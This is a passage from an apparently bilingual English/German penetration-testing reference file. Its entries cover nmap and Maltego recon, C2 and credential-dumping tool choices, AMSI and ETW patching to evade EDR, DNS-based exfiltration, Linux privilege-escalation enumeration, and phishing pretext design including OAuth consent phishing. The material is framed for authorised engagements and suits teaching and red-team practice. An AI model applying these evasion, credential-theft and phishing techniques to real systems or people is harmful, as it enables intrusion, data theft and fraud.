  <li><strong>Version-Pinning eines Dienstes.</strong> <code>nmap -sV --version-intensity 9 -p 443 target</code>. Erzwingt jede Probe, nützlich wenn Default-Version-Detection "tcpwrapped" oder leer zurückgibt.</li>
  <li><strong>NSE für einen spezifischen Dienst.</strong> <code>nmap --script "smb-vuln*" -p 445 target</code> (oder <code>http-*</code>, <code>ssl-*</code>, <code>ldap-*</code>). NSE-Kategorien filtern — niemals <code>--script all</code> gegen Produktion.</li>
  <li><strong>UDP, wenn nötig.</strong> <code>nmap -sU --top-ports 30 -T4 target</code>. UDP ist langsam und unzuverlässig; auf bekannt interessante Ports scopen (53, 161, 500, 4500, 5353).</li>
</ul>

<h2>nmap-Rezepte pro Phase</h2>
<ul>
  <li><strong>Initiale Recon.</strong> <code>masscan -p1-65535 --rate 10000</code> um offene Ports zu finden, dann <code>nmap -sV -sC</code> gegen das gefundene Set. Zwei-Stufen-Scan spart Stunden.</li>
  <li><strong>Authentifizierter Kontext (Post-Foothold).</strong> <code>nmap -sn 10.0.0.0/8</code> für Nachbar-Segment-Discovery. Vom Pivot-Host laufen lassen, nicht extern. Nur ICMP um leise zu bleiben.</li>
  <li><strong>Post-Exploitation-Enum.</strong> <code>nmap --script smb-enum-shares,smb-enum-users --script-args smbusername=u,smbpassword=p target</code>. Authentifiziertes NSE liefert Enumeration, die anonyme Scans verpassen.</li>
</ul>

<h2>Maltego — Transform-Ketten</h2>
<ul>
  <li><strong>Personen → Infrastruktur.</strong> Domain → DNS-A-Records → IP → ASN → alle anderen Domains in dem ASN. Deckt versteckte Zweitmarken- und Akquise-Assets auf.</li>
  <li><strong>Personen → Social Graph.</strong> Name → LinkedIn-Profil → Kollegen → E-Mails (via Hunter/Apollo-Transform) → Password-Spray-Kandidatenliste.</li>
  <li><strong>E-Mail → Breach-Data.</strong> E-Mail → HaveIBeenPwned-Breach-Liste → Passwort-Muster aus öffentlichen Dumps (nur im juristischen Scope). Kritisch für Password-Spray-Realismus.</li>
  <li><strong>Infrastruktur → Certificate-Transparency.</strong> Domain → CT-Log-Einträge → alle historischen Certs → alle je ausgestellten Subdomains. Fängt Assets, die DNS-Bruteforce verpasst.</li>
</ul>

<h2>Kurationsdisziplin</h2>
<ul>
  <li><strong>Triage vor Report.</strong> Maltego-Graphen wachsen unbegrenzt; das Deliverable ist der getrimmte Subgraph, der einen konkreten Befund stützt, nicht der Roh-Output.</li>
  <li><strong>Konfidenz pro Entity.</strong> Geraten vs. bestätigt im Node-Metadata markieren. Ohne das können Reviewer später Fakt von Inferenz nicht trennen.</li>
  <li><strong>Vor jeder Engagement-Phase neu laufen.</strong> Recon-Outputs altern schnell. CT-Logs von letzter Woche verpassen diese Woche neue Certs.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Wenn ein nmap-Scan länger dauert als budgetiert, abbrechen und mit <code>--top-ports</code> zuerst laufen. Du kannst immer tiefer gehen, nachdem du den Top-Port-Output gesehen hast. Lange Blind-Full-Port-Scans verbrennen Detektionszeit ohne neue Information zu liefern.</div>
`
    ),
    phases: ["recon", "fingerprint", "auth"]
  },
  {
    id: "operator-toolkits",
    domain: "offensive-tradecraft", tier: 2,
    title: T("Operator Toolkits — Catalog & Reference", "Operator-Toolkits — Katalog & Referenz"),
    blurb: T(
      "Meterpreter, PowerShell, and the broader pentest toolkit catalog — recommended defaults per slot, with the Linux and Python operator notes that round out the kit.",
      "Meterpreter, PowerShell und der erweiterte Pentest-Toolkit-Katalog — empfohlene Defaults pro Slot, ergänzt um Linux- und Python-Operator-Notizen."
    ),
    body: B(
      `
<h2>Toolkit by slot — default + fallback</h2>
<ul>
  <li><strong>C2.</strong> Default Sliver (open source, modern, robust). Fallback Cobalt Strike (still the polished baseline, IOC-loud). Mythic for engagements where modular agents are needed.</li>
  <li><strong>Initial access — Windows.</strong> Default <code>InveighZero</code> for LLMNR/NBT-NS responder + <code>ntlmrelayx</code> chain. Fallback <code>responder</code> + <code>impacket-ntlmrelayx</code>.</li>
  <li><strong>Credential dump — Windows.</strong> Default <code>nanodump</code> (PROCEXP152-style, bypasses many EDR LSASS hooks). Fallback <code>secretsdump.py -ntds</code> via VSS shadow copy on DC.</li>
  <li><strong>Lateral movement.</strong> Default WinRM via <code>evil-winrm</code> (least loud), then SMB-Exec via <code>impacket-psexec</code>, last resort DCOM via <code>impacket-dcomexec</code>.</li>
  <li><strong>Privilege escalation enum.</strong> Default <code>winPEAS</code> / <code>linPEAS</code>. Fallback <code>PowerUp.ps1</code> for Windows token paths.</li>
  <li><strong>Exfiltration.</strong> Default DNS over Cloudflare DoH (<code>iodine</code>, custom). Fallback HTTPS to attacker domain with valid Let's Encrypt cert.</li>
</ul>

<h2>Meterpreter — commands to know cold</h2>
<ul>
  <li><strong>Session management.</strong> <code>background</code>, <code>sessions -i N</code>, <code>sessions -u N</code> upgrade shell→meterpreter, <code>sessions -K</code> kill all.</li>
  <li><strong>Pivoting.</strong> <code>route add 10.10.10.0/24 N</code>, then <code>auxiliary/server/socks_proxy</code> on operator side.</li>
  <li><strong>Post-modules.</strong> <code>post/windows/gather/hashdump</code>, <code>post/windows/manage/migrate</code>, <code>post/multi/recon/local_exploit_suggester</code>.</li>
  <li><strong>Don't.</strong> <code>getsystem</code> on EDR-hardened hosts — every technique it tries is flagged. Use credential-based pathways instead.</li>
</ul>

<h2>PowerShell that survives modern EDR</h2>
<ul>
  <li><strong>AMSI bypass.</strong> Patch <code>amsi.dll!AmsiScanBuffer</code> in-memory before loading payload. Signatures rotate; use a current loader.</li>
  <li><strong>Constrained Language Mode escape.</strong> Find a signed binary that loads attacker-controlled DLL (DLL hijack via signed COM/RunDLL surface).</li>
  <li><strong>Avoid <code>Invoke-Expression</code>, <code>DownloadString</code>.</strong> Both ETW-logged and signature-matched. Prefer <code>[Reflection.Assembly]::Load([Convert]::FromBase64String(...))</code> with rotated obfuscation.</li>
  <li><strong>Disable PowerShell logging at the script-block level.</strong> Patch ETW via <code>ntdll!EtwEventWrite</code> hook before any logged command.</li>
</ul>

<h2>Linux post-foothold</h2>
<ul>
  <li><strong>Capability enum.</strong> <code>getcap -r / 2>/dev/null</code>. <code>cap_setuid</code>, <code>cap_dac_read_search</code>, <code>cap_sys_admin</code> are immediate paths to root.</li>
  <li><strong>SUID chains.</strong> <code>find / -perm -4000 -type f 2>/dev/null</code>. Cross-check each result against GTFOBins.</li>
  <li><strong>Kernel exploit selection.</strong> <code>uname -a</code> + <code>linux-exploit-suggester.sh</code>. Last resort only — kernel exploits crash hosts, document scope explicitly.</li>
  <li><strong>Cron + systemd.</strong> <code>cat /etc/crontab /etc/cron.*/* 2>/dev/null</code>; <code>systemctl list-timers</code>. Writable cron scripts run as root often enough to check first.</li>
  <li><strong>Mount + path injection.</strong> <code>mount | grep -v nosuid</code> for missing nosuid mount option; <code>echo $PATH</code> for writable PATH entries before root commands.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>Match the tool to the host's defensive posture. Cobalt Strike on a vanilla Defender host is fine. Cobalt Strike on a Crowdstrike-managed host is a fast way to get caught. Know what they run before you load.</div>
`,
      `
<h2>Toolkit pro Slot — Standard + Fallback</h2>
<ul>
  <li><strong>C2.</strong> Standard Sliver (Open Source, modern, robust). Fallback Cobalt Strike (noch die polierte Baseline, IOC-laut). Mythic für Engagements mit modularen Agent-Bedarf.</li>
  <li><strong>Initial Access — Windows.</strong> Standard <code>InveighZero</code> für LLMNR/NBT-NS-Responder + <code>ntlmrelayx</code>-Kette. Fallback <code>responder</code> + <code>impacket-ntlmrelayx</code>.</li>
  <li><strong>Credential-Dump — Windows.</strong> Standard <code>nanodump</code> (PROCEXP152-Style, umgeht viele EDR-LSASS-Hooks). Fallback <code>secretsdump.py -ntds</code> via VSS-Shadow-Copy auf DC.</li>
  <li><strong>Lateral Movement.</strong> Standard WinRM via <code>evil-winrm</code> (am leisesten), dann SMB-Exec via <code>impacket-psexec</code>, letzter Ausweg DCOM via <code>impacket-dcomexec</code>.</li>
  <li><strong>Privilege-Escalation-Enum.</strong> Standard <code>winPEAS</code> / <code>linPEAS</code>. Fallback <code>PowerUp.ps1</code> für Windows-Token-Pfade.</li>
  <li><strong>Exfiltration.</strong> Standard DNS über Cloudflare DoH (<code>iodine</code>, custom). Fallback HTTPS zu Angreifer-Domain mit valid Let's Encrypt Cert.</li>
</ul>

<h2>Meterpreter — Kommandos auswendig</h2>
<ul>
  <li><strong>Session-Management.</strong> <code>background</code>, <code>sessions -i N</code>, <code>sessions -u N</code> Shell→Meterpreter upgraden, <code>sessions -K</code> alle killen.</li>
  <li><strong>Pivoting.</strong> <code>route add 10.10.10.0/24 N</code>, dann <code>auxiliary/server/socks_proxy</code> operator-seitig.</li>
  <li><strong>Post-Module.</strong> <code>post/windows/gather/hashdump</code>, <code>post/windows/manage/migrate</code>, <code>post/multi/recon/local_exploit_suggester</code>.</li>
  <li><strong>Nicht.</strong> <code>getsystem</code> auf EDR-gehärteten Hosts — jede Technik wird geflagged. Stattdessen credential-basierte Pfade.</li>
</ul>

<h2>PowerShell, die modernes EDR übersteht</h2>
<ul>
  <li><strong>AMSI-Bypass.</strong> <code>amsi.dll!AmsiScanBuffer</code> in-Memory patchen bevor Payload geladen wird. Signaturen rotieren; aktuellen Loader nutzen.</li>
  <li><strong>Constrained-Language-Mode-Escape.</strong> Signierten Binary finden, der angreifer-kontrollierte DLL lädt (DLL-Hijack via signierte COM-/RunDLL-Oberfläche).</li>
  <li><strong>Vermeiden: <code>Invoke-Expression</code>, <code>DownloadString</code>.</strong> Beide ETW-geloggt und signature-matched. Lieber <code>[Reflection.Assembly]::Load([Convert]::FromBase64String(...))</code> mit rotierter Obfuskation.</li>
  <li><strong>PowerShell-Logging auf Script-Block-Ebene deaktivieren.</strong> ETW patchen via <code>ntdll!EtwEventWrite</code>-Hook vor jedem geloggten Kommando.</li>
</ul>

<h2>Linux-Post-Foothold</h2>
<ul>
  <li><strong>Capability-Enum.</strong> <code>getcap -r / 2>/dev/null</code>. <code>cap_setuid</code>, <code>cap_dac_read_search</code>, <code>cap_sys_admin</code> sind sofortige Wege zu root.</li>
  <li><strong>SUID-Ketten.</strong> <code>find / -perm -4000 -type f 2>/dev/null</code>. Jedes Resultat gegen GTFOBins prüfen.</li>
  <li><strong>Kernel-Exploit-Auswahl.</strong> <code>uname -a</code> + <code>linux-exploit-suggester.sh</code>. Nur letzter Ausweg — Kernel-Exploits crashen Hosts, Scope explizit dokumentieren.</li>
  <li><strong>Cron + systemd.</strong> <code>cat /etc/crontab /etc/cron.*/* 2>/dev/null</code>; <code>systemctl list-timers</code>. Beschreibbare Cron-Scripts laufen oft genug als root, um zuerst zu prüfen.</li>
  <li><strong>Mount + Path-Injection.</strong> <code>mount | grep -v nosuid</code> für fehlende nosuid-Mount-Option; <code>echo $PATH</code> für beschreibbare PATH-Einträge vor Root-Kommandos.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Tool an die defensive Haltung des Hosts anpassen. Cobalt Strike auf vanilla-Defender-Host ist okay. Cobalt Strike auf Crowdstrike-managed Host ist ein schneller Weg, erwischt zu werden. Wissen, was sie betreiben, bevor du lädst.</div>
`
    ),
    phases: ["methodology"]
  },
  {
    id: "automation-vs-manual",
    domain: "offensive-tradecraft", tier: 2,
    title: T("Automation vs. Manual Testing", "Automatisierung vs. manuelles Testing"),
    blurb: T(
      "Where automation earns its keep, where it misses by design, and the seams where a human reviewer must take over — paired against the manual techniques that resist tooling.",
      "Wo Automatisierung sich rentiert, wo sie konstruktionsbedingt vorbeischaut und an welchen Nähten ein menschlicher Reviewer übernehmen muss — gegenübergestellt mit den manuellen Techniken, die sich Tooling entziehen."
    ),
    body: B(
      `
<h2>Where automation earns its keep</h2>
<ul>
  <li><strong>Directory + parameter fuzzing.</strong> <code>ffuf</code> against a quality wordlist surfaces 80% of forgotten endpoints in minutes. Humans cannot beat this volumetrically.</li>
  <li><strong>Reflected XSS in clearly tainted params.</strong> <code>Dalfox</code> or Burp Active Scan finds the obvious sinks. Tag-and-attribute reflection patterns are well-covered.</li>
  <li><strong>Classic SQLi in URL/POST params.</strong> <code>sqlmap</code> against a parameter that the developer didn't bind correctly. Time-based and union-based both well-handled.</li>
  <li><strong>Known-CVE checks.</strong> <code>nuclei</code> against a fingerprinted stack. Templates encode the exact request shape; minimal tester time per finding.</li>
  <li><strong>Response-shape diffing.</strong> Send 50 payloads, compare response sizes/codes/headers, sort by deviation. Surfaces inconsistencies a human eye would miss.</li>
  <li><strong>TLS posture checks.</strong> <code>testssl.sh</code>, <code>sslyze</code>. Mechanical and complete.</li>
</ul>

<h2>Where automation goes silent</h2>
<ul>
  <li><strong>Business logic.</strong> The attack is a legitimate sequence of legitimate calls — discount stacking, race-condition double-spend, multi-step authorization checks. No fuzzer reconstructs intent.</li>
  <li><strong>Authorization across pages and roles.</strong> User A creates resource, User B retrieves via guessed ID. Scanner runs as User A only and never sees the gap.</li>
  <li><strong>Stored XSS where source and sink are decoupled.</strong> Attacker submits form A, payload renders on admin dashboard B. Dynamic scanner never crosses the surface boundary.</li>
  <li><strong>Authentication-state coupling.</strong> Action requires state X set by prior action Y. Scanner replays in isolation and gets a 400 instead of the vulnerable path.</li>
  <li><strong>Logic-based IDOR.</strong> ID is a UUID, not enumerable. Manual analysis needed to recognize that the UUID is exposed in a sibling endpoint's response.</li>
  <li><strong>Authentication bypass via parser confusion.</strong> Trailing newline, unicode normalization, JSON parsing differences between auth layer and app layer. Requires hypothesis-driven testing.</li>
</ul>

<h2>Allocation rule</h2>
<ul>
  <li><strong>Day 1.</strong> Run all automation in parallel while you walk the application manually. Both inputs feed day 2.</li>
  <li><strong>Day 2–N.</strong> Manual testing on the surfaces automation can't reach. Use automation output as a triage map, not as findings.</li>
  <li><strong>Last day.</strong> Re-run automation against any changes the team made during testing. Confirms regressions in real time, before the report.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>If 80% of the findings in a report came from automated scanner output, the engagement underdelivered. The unique value of a human tester is exactly the findings automation cannot reach. Bill accordingly.</div>
`,
      `
<h2>Wo Automatisierung sich rentiert</h2>
<ul>
  <li><strong>Directory- + Parameter-Fuzzing.</strong> <code>ffuf</code> gegen eine qualitative Wordlist deckt 80% der vergessenen Endpunkte in Minuten auf. Menschen schaffen das volumetrisch nicht.</li>
  <li><strong>Reflected XSS in klar tainted Params.</strong> <code>Dalfox</code> oder Burp Active Scan findet die offensichtlichen Sinks. Tag-und-Attribut-Reflektionsmuster sind gut abgedeckt.</li>
  <li><strong>Klassische SQLi in URL-/POST-Params.</strong> <code>sqlmap</code> gegen einen Parameter, den der Entwickler nicht korrekt gebunden hat. Time-Based und Union-Based beide gut behandelt.</li>
  <li><strong>Bekannte-CVE-Checks.</strong> <code>nuclei</code> gegen einen fingerprinteten Stack. Templates codieren die exakte Request-Form; minimale Tester-Zeit pro Befund.</li>
  <li><strong>Response-Shape-Diffing.</strong> 50 Payloads senden, Response-Größen/-Codes/-Headers vergleichen, nach Abweichung sortieren. Deckt Inkonsistenzen auf, die ein menschliches Auge verpasst.</li>
  <li><strong>TLS-Posture-Checks.</strong> <code>testssl.sh</code>, <code>sslyze</code>. Mechanisch und vollständig.</li>
</ul>

<h2>Wo Automatisierung stumm bleibt</h2>
<ul>
  <li><strong>Business Logic.</strong> Der Angriff ist eine legitime Sequenz legitimer Aufrufe — Rabatt-Stacking, Race-Condition-Double-Spend, mehrstufige Autorisierungschecks. Kein Fuzzer rekonstruiert Intention.</li>
  <li><strong>Autorisierung über Seiten und Rollen.</strong> User A erstellt Ressource, User B holt sie via geratener ID. Scanner läuft nur als User A und sieht die Lücke nie.</li>
  <li><strong>Stored XSS wo Source und Sink entkoppelt sind.</strong> Angreifer submitted Form A, Payload rendert im Admin-Dashboard B. Dynamic-Scanner überquert die Oberflächengrenze nie.</li>
  <li><strong>Authentifizierungs-State-Kopplung.</strong> Action erfordert State X, gesetzt durch vorherige Action Y. Scanner replayed isoliert und kriegt 400 statt verwundbaren Pfad.</li>
  <li><strong>Logik-basierte IDOR.</strong> ID ist UUID, nicht enumerierbar. Manuelle Analyse nötig, um zu erkennen, dass die UUID in der Response eines Schwester-Endpunkts exponiert ist.</li>
  <li><strong>Auth-Bypass via Parser-Confusion.</strong> Trailing Newline, Unicode-Normalisierung, JSON-Parsing-Unterschiede zwischen Auth- und App-Layer. Erfordert hypothesengetriebenes Testen.</li>
</ul>

<h2>Allokations-Regel</h2>
<ul>
  <li><strong>Tag 1.</strong> Alle Automatisierung parallel laufen lassen, während die App manuell durchgegangen wird. Beide Inputs füttern Tag 2.</li>
  <li><strong>Tag 2–N.</strong> Manuelles Testen auf den Oberflächen, die Automatisierung nicht erreicht. Automatisierungs-Output als Triage-Karte nutzen, nicht als Befunde.</li>
  <li><strong>Letzter Tag.</strong> Automatisierung gegen jede Änderung, die das Team während des Testens gemacht hat, neu laufen. Bestätigt Regressionen in Echtzeit, vor dem Report.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Wenn 80% der Befunde im Report aus Scanner-Output stammen, hat das Engagement unterdelivert. Der einzigartige Wert eines menschlichen Testers sind genau die Befunde, die Automatisierung nicht erreicht. Entsprechend abrechnen.</div>
`
    ),
    phases: ["recon", "dir-fuzz", "xss", "sqli", "biz-logic"]
  },
  {
    id: "social-engineering-phishing",
    domain: "offensive-tradecraft", tier: 3,
    title: T("Social Engineering & Phishing", "Social Engineering & Phishing"),
    blurb: T(
      "Pretext design, channel selection, and the patterns specific to phishing privileged users — including the failure modes that turn a campaign into an internal incident on your side.",
      "Pretext-Design, Kanalwahl und die Muster speziell für Phishing privilegierter Nutzer — inklusive der Fehlermodi, die eine Kampagne in einen internen Vorfall auf eigener Seite verwandeln."
    ),
    body: B(
      `
<h2>Pretext-design — what works</h2>
<ul>
  <li><strong>Aligned with real work.</strong> Reference an actual ticketing system, an actual vendor, an actual quarterly process. OSINT first, write second.</li>
  <li><strong>Plausible CTA.</strong> "Confirm your timesheet by Friday" beats "Verify your password now." The action requested is something the target would expect to do anyway.</li>
  <li><strong>No escalation pressure.</strong> "Urgent — locked account in 1 hour" trips the training reflex. Legitimate IT rarely uses countdown threats.</li>
  <li><strong>Look like the system, not like an attacker.</strong> Office 365 legitimate notification → copy the HTML structure, headers, footer, unsubscribe link. Diff vs. a real one until they're indistinguishable.</li>
  <li><strong>Right sender.</strong> Spoofed display name + neighboring-domain typosquat. Targets read the display name; only ~5% check the actual From: header.</li>
</ul>

<h2>Channel tradeoffs</h2>
<ul>
  <li><strong>Email.</strong> Highest volume, lowest conversion. Defended by mail gateways, sandbox detonation, URL rewriting. Plan for 5–15% click rate on first send.</li>
  <li><strong>SMS (smishing).</strong> Lower volume capacity, higher conversion. Sandbox doesn't exist for SMS the way it does for email. Plan for 20–35% click rate when pretext is sharp.</li>
  <li><strong>Voice (vishing).</strong> Highest conversion against helpdesk staff. Hardest to script. Most effective on Monday mornings when ticket volume is highest.</li>
  <li><strong>In-person / physical.</strong> Tailgating, dropped-USB. Highest legal/scope risk. Always written-authorized with on-call white cell contact.</li>
  <li><strong>Supplier impersonation.</strong> Email from a known vendor with a known payment-detail change request. Very high conversion against finance teams; high legal scrutiny.</li>
</ul>

<h2>Targeting admins specifically</h2>
<ul>
  <li><strong>Tooling-trust.</strong> Admins click links from tools they use daily — Jira, Confluence, PagerDuty, GitHub. Pretext that looks like a notification from one of those.</li>
  <li><strong>Helpdesk pretext.</strong> Reverse the direction. You call as a user with an authentic-looking ticket reference; ask helpdesk to push an MFA, claim "phone broke", get a temporary code.</li>
  <li><strong>Console-link redirect.</strong> URL that lands on a real admin console first, then redirects to your harvester. Browser security indicators show "secure" because the first hop was real.</li>
  <li><strong>OAuth consent phishing.</strong> Don't phish password; phish an OAuth scope grant. The target sees a real Microsoft consent page and clicks Allow.</li>
</ul>

<h2>Operational guardrails (don't burn the engagement)</h2>
<ul>
  <li><strong>Written scope, named targets only.</strong> No improvising new recipients mid-campaign.</li>
  <li><strong>Credentials handled by one operator.</strong> Captured creds never sit in a shared inbox or chat. Hash them at capture, store the hash, decrypt only at use.</li>
  <li><strong>Sender infra cleanly attributable on request.</strong> Don't reuse domains across clients. Don't reuse the SAME domain you used for actual blue-team work last quarter.</li>
  <li><strong>Kill switch.</strong> Single command that takes down all landing pages, revokes captured tokens, and notifies white cell. Test it before campaign launch.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>The cleanest phishing campaign is the one the blue team learns the most from. Maximize that, not raw click rate. A 40% click rate with no detection-loop feedback teaches nothing; a 12% click rate that the SOC catches in 11 minutes is a successful exercise.</div>
`,
      `
<h2>Pretext-Design — was funktioniert</h2>
<ul>
  <li><strong>An echte Arbeit angepasst.</strong> Referenz auf ein echtes Ticketing-System, einen echten Vendor, einen echten Quartals-Prozess. OSINT zuerst, schreiben zweitens.</li>
  <li><strong>Plausibler CTA.</strong> "Bestätige deine Timesheet bis Freitag" schlägt "Verifiziere dein Passwort jetzt." Die angefragte Aktion ist etwas, das das Ziel sowieso erwarten würde zu tun.</li>
  <li><strong>Kein Eskalationsdruck.</strong> "Dringend — Account in 1 Stunde gesperrt" triggert den Trainings-Reflex. Legitime IT nutzt selten Countdown-Drohungen.</li>
  <li><strong>Wie das System aussehen, nicht wie ein Angreifer.</strong> Office-365-legitime Notification → HTML-Struktur, Header, Footer, Unsubscribe-Link kopieren. Vs. eine echte diffen bis ununterscheidbar.</li>
  <li><strong>Richtiger Sender.</strong> Spoofed Display Name + benachbarter Domain-Typosquat. Ziele lesen den Display Name; nur ~5% prüfen den tatsächlichen From:-Header.</li>
</ul>

<h2>Kanal-Trade-offs</h2>
<ul>
  <li><strong>E-Mail.</strong> Höchstes Volumen, niedrigste Conversion. Verteidigt durch Mail-Gateways, Sandbox-Detonation, URL-Rewriting. Mit 5–15% Click-Rate bei Erstsend rechnen.</li>
  <li><strong>SMS (Smishing).</strong> Niedrigere Volumen-Kapazität, höhere Conversion. Sandbox existiert für SMS nicht so wie für E-Mail. Mit 20–35% Click-Rate rechnen, wenn der Pretext scharf ist.</li>
  <li><strong>Voice (Vishing).</strong> Höchste Conversion gegen Helpdesk-Personal. Am schwersten zu skripten. Am effektivsten Montagmorgens bei höchstem Ticket-Volumen.</li>
  <li><strong>In-Person / physisch.</strong> Tailgating, Dropped-USB. Höchstes juristisches-/Scope-Risiko. Immer schriftlich autorisiert mit On-Call-White-Cell-Kontakt.</li>
  <li><strong>Supplier-Impersonation.</strong> E-Mail von bekanntem Vendor mit bekanntem Payment-Detail-Change-Request. Sehr hohe Conversion gegen Finance-Teams; hohe juristische Prüfung.</li>
</ul>

<h2>Speziell Admins anvisieren</h2>
<ul>
  <li><strong>Tooling-Trust.</strong> Admins klicken Links aus Tools, die sie täglich nutzen — Jira, Confluence, PagerDuty, GitHub. Pretext, der wie eine Notification aus einem davon aussieht.</li>
  <li><strong>Helpdesk-Pretext.</strong> Richtung umkehren. Du rufst als User mit authentisch wirkender Ticket-Referenz an; bittest Helpdesk, eine MFA zu pushen, behauptest "Handy kaputt", bekommst einen temporären Code.</li>
  <li><strong>Console-Link-Redirect.</strong> URL, die zuerst auf echter Admin-Console landet, dann zu deinem Harvester redirected. Browser-Security-Indikatoren zeigen "sicher", weil der erste Hop echt war.</li>
  <li><strong>OAuth-Consent-Phishing.</strong> Kein Passwort phishen; einen OAuth-Scope-Grant phishen. Das Ziel sieht eine echte Microsoft-Consent-Seite und klickt Allow.</li>
</ul>

<h2>Operative Leitplanken (Engagement nicht verbrennen)</h2>
<ul>
  <li><strong>Schriftlicher Scope, nur benannte Targets.</strong> Kein Improvisieren neuer Empfänger mitten in der Kampagne.</li>
  <li><strong>Credentials von einem Operator gehandled.</strong> Erbeutete Creds liegen nie in einer geteilten Inbox oder einem Chat. Hashen bei Capture, Hash speichern, nur bei Nutzung entschlüsseln.</li>
  <li><strong>Sender-Infra auf Anfrage sauber attributierbar.</strong> Domains nicht über Kunden hinweg wiederverwenden. NICHT die gleiche Domain, mit der du letztes Quartal echte Blue-Team-Arbeit gemacht hast.</li>
  <li><strong>Kill-Switch.</strong> Ein Kommando, das alle Landing-Pages runterfährt, erbeutete Tokens revoked und White Cell benachrichtigt. Vor Kampagnenstart testen.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Die sauberste Phishing-Kampagne ist die, aus der das Blue Team am meisten lernt. Das maximieren, nicht die rohe Click-Rate. 40% Click-Rate ohne Detection-Loop-Feedback lehrt nichts; 12% Click-Rate, die der SOC in 11 Minuten fängt, ist eine erfolgreiche Übung.</div>
`
    ),
    phases: ["auth"]
  },
  {
    id: "pentester-foundations",
    domain: "offensive-tradecraft", tier: 3,
    title: T("Pentester Foundations & CTF Practice", "Pentester-Grundlagen & CTF-Praxis"),
    blurb: T(
      "Senior-tester skill rubric, repo-archaeology techniques for security engineers, and the CTF tooling and infrastructure references that keep practice sharp.",
      "Skill-Rubric für Senior-Tester, Repo-Archäologie für Security-Engineers und die CTF-Tool- und Infrastruktur-Referenzen, die die Praxis scharf halten."
    ),
    body: B(
      `
<h2>Senior-tester competencies</h2>
<ul>
  <li><strong>Reconnaissance.</strong> Can build an asset inventory of a target from public sources alone, with confidence per asset. Knows when active scanning is the right next step and when it isn't.</li>
  <li><strong>Web application.</strong> Can identify, exploit, and report every class in the OWASP Top 10 from memory. Can read source code in at least Python, JS, and Java to verify a finding.</li>
  <li><strong>Identity and AD.</strong> Can run BloodHound, read its output, and pick the right edge to chase. Understands Kerberos delegation well enough to weaponize and to defend.</li>
  <li><strong>Network and pivoting.</strong> Can stand up a SOCKS pivot, a reverse-tunnel through HTTPS, and a multi-hop ligolo chain without referencing docs. Knows when each is the right choice.</li>
  <li><strong>Cloud.</strong> Comfortable in at least AWS or Azure: IAM model, metadata-service abuse, common SaaS-trust pivot patterns.</li>
  <li><strong>Detection.</strong> Knows what each technique looks like in Sysmon / Defender / Crowdstrike. Picks tools by IOC profile, not by familiarity.</li>
  <li><strong>Reporting.</strong> Writes findings that survive an executive review without losing technical correctness. Reproducible steps for every claim.</li>
</ul>

<h2>Git as a recon surface</h2>
<ul>
  <li><strong>Secret hunting in history.</strong> <code>trufflehog filesystem --since-commit HEAD~1000 .</code>, <code>gitleaks detect</code>. Secrets removed from HEAD often remain in history; check old branches and tags too.</li>
  <li><strong>Author archaeology.</strong> <code>git log --pretty=format:'%an %ae' | sort -u</code> for the contributor list — feeds OSINT for phishing recon. Commit timestamps reveal working hours.</li>
  <li><strong>Fork comparison for vuln triage.</strong> When upstream patches a CVE, <code>git log upstream/main..fork/main</code> tells you which downstream forks haven't pulled the fix.</li>
  <li><strong>Reflog and unreachable commits.</strong> <code>git fsck --lost-found</code> recovers committed-then-orphaned secrets that the author thought they'd erased.</li>
  <li><strong>GitHub-specific.</strong> <code>github-search</code> tooling for org-wide search; deleted-fork commits remain visible through API for ~90 days.</li>
</ul>

<h2>CTF tooling worth muscle memory</h2>
<ul>
  <li><strong>Web.</strong> Burp Suite (with extender keymaps), ffuf, sqlmap, gobuster.</li>
  <li><strong>Binary.</strong> Ghidra, gdb + GEF, pwntools, ROPgadget, one_gadget.</li>
  <li><strong>Crypto.</strong> sage, cryptohack solvers, RsaCtfTool.</li>
  <li><strong>Forensics.</strong> volatility3, autopsy, binwalk, exiftool, foremost.</li>
  <li><strong>Steg.</strong> stegsolve, zsteg, stegseek, audacity for audio.</li>
  <li><strong>Network/reverse.</strong> wireshark with custom dissectors, scapy for crafting.</li>
</ul>

<h2>Building a private attack/defense range</h2>
<ul>
  <li><strong>VPN topology.</strong> WireGuard hub, one /24 per team. Egress to scoring loop only.</li>
  <li><strong>Vulnerable services.</strong> Rotate the seeded vuln set every 15 minutes from a curated bank of historic CVEs — keeps participants from coasting on yesterday's exploit.</li>
  <li><strong>Scoring loop.</strong> Out-of-band agent on each service that performs SLA checks (availability, correctness) and flag rotation. Agent runs from a network the teams cannot reach.</li>
  <li><strong>Replay capture.</strong> tcpdump on the scoring network for after-action review. Most learning happens in the replay session, not in the live game.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>CTFs sharpen specific muscles. They do not substitute for real engagements. A senior tester does both: regular CTF practice to keep technique sharp, and real client work to keep judgment calibrated to production environments.</div>
`,
      `
<h2>Senior-Tester-Kompetenzen</h2>
<ul>
  <li><strong>Reconnaissance.</strong> Kann aus öffentlichen Quellen ein Asset-Inventar eines Ziels mit Konfidenz pro Asset bauen. Weiß, wann aktives Scanning der nächste Schritt ist und wann nicht.</li>
  <li><strong>Web-Anwendung.</strong> Kann jede Klasse der OWASP Top 10 aus dem Kopf identifizieren, exploiten und reporten. Kann mindestens Python-, JS- und Java-Source lesen, um einen Befund zu verifizieren.</li>
  <li><strong>Identity und AD.</strong> Kann BloodHound laufen lassen, den Output lesen und die richtige Kante wählen. Versteht Kerberos-Delegation gut genug, um zu waffenisieren und zu verteidigen.</li>
  <li><strong>Netzwerk und Pivoting.</strong> Kann einen SOCKS-Pivot, einen Reverse-Tunnel durch HTTPS und eine Multi-Hop-ligolo-Kette ohne Doku-Referenz aufsetzen. Weiß, wann was die richtige Wahl ist.</li>
  <li><strong>Cloud.</strong> Mindestens in AWS oder Azure zu Hause: IAM-Modell, Metadata-Service-Missbrauch, gängige SaaS-Trust-Pivot-Muster.</li>
  <li><strong>Detektion.</strong> Weiß, wie jede Technik in Sysmon / Defender / Crowdstrike aussieht. Wählt Tools nach IOC-Profil, nicht nach Vertrautheit.</li>
  <li><strong>Reporting.</strong> Schreibt Befunde, die ein Executive-Review überstehen, ohne technische Korrektheit zu verlieren. Reproduzierbare Schritte für jede Behauptung.</li>
</ul>

<h2>Git als Recon-Oberfläche</h2>
<ul>
